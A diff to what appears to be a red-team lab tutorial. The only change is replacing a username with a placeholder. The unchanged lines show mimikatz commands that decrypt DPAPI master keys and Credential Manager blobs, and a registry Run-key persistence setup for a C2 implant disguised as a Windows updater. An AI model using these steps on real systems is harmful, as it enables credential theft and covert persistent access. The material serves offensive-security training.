@@ -784,26 +784,26 @@ in a lab environment where a meterpreter session runs in the context of the logg
 
 # Step 1: Locate the user's DPAPI master key file
 # => master keys live in %APPDATA%\Microsoft\Protect\<SID>\<GUID>
-dir "C:\Users\jsmith\AppData\Roaming\Microsoft\Protect\S-1-5-21-...-1109\"
+dir "C:\Users\<name>\AppData\Roaming\Microsoft\Protect\S-1-5-21-...-1109\"
 # => 2026-01-15  09:30    262144  a1b2c3d4-e5f6-7890-abcd-ef1234567890
 # => the GUID file is the encrypted master key; needs user password or domain backup key
 
 # Step 2: Decrypt master key using the user's logon password
 mimikatz # dpapi::masterkey \
-  /in:"C:\Users\jsmith\AppData\Roaming\Microsoft\Protect\S-1-5-21-...-1109\a1b2c3d4-e5f6-7890-abcd-ef1234567890" \
+  /in:"C:\Users\<name>\AppData\Roaming\Microsoft\Protect\S-1-5-21-...-1109\a1b2c3d4-e5f6-7890-abcd-ef1234567890" \
   /password:"Summer2024!"
 # => [masterkey] with password: Summer2024! (normal user)
 # =>   key : 3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a
 # =>   sha1: 8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d
 
 # Step 3: Locate credential blobs (e.g., Windows Credential Manager)
-dir "C:\Users\jsmith\AppData\Local\Microsoft\Credentials\"
+dir "C:\Users\<name>\AppData\Local\Microsoft\Credentials\"
 # => 2026-01-20  14:22     1,234  DFBE70A7E5CC19A398EBF1B96FBEE0AD
 # => each file is a DPAPI-encrypted credential blob
 
 # Step 4: Decrypt the credential blob using the decrypted master key
 mimikatz # dpapi::cred \
-  /in:"C:\Users\jsmith\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96FBEE0AD" \
+  /in:"C:\Users\<name>\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96FBEE0AD" \
   /masterkey:3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a
 # =>  * volatile cache: GUID:{a1b2c3d4-...}; SHA1: 8a9b0c1d...
 # =>  TargetName  : Domain:target=CORP\DC01
@@ -1046,7 +1046,7 @@ lab host after initial access as a standard domain user.
 # Registry Run key persistence — HKCU (no admin required) and HKLM (admin required)
 
 # Step 1: HKCU Run key — persists for current user's logon sessions only
-$payload = "C:\Users\jsmith\AppData\Roaming\updater.exe"
+$payload = "C:\Users\<name>\AppData\Roaming\updater.exe"
 # => payload path: hidden in AppData to avoid casual inspection
 # => updater.exe is our C2 implant, renamed to look like a legitimate updater
 
@@ -1064,7 +1064,7 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" `
 # Verify the key was written
 reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
 # => HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
-# =>     WindowsUpdater    REG_SZ    C:\Users\jsmith\AppData\Roaming\updater.exe
+# =>     WindowsUpdater    REG_SZ    C:\Users\<name>\AppData\Roaming\updater.exe
 # =>     OneDrive          REG_SZ    "C:\Program Files\Microsoft OneDrive\OneDrive.exe"
 # => our key blends with legitimate entries like OneDrive
 
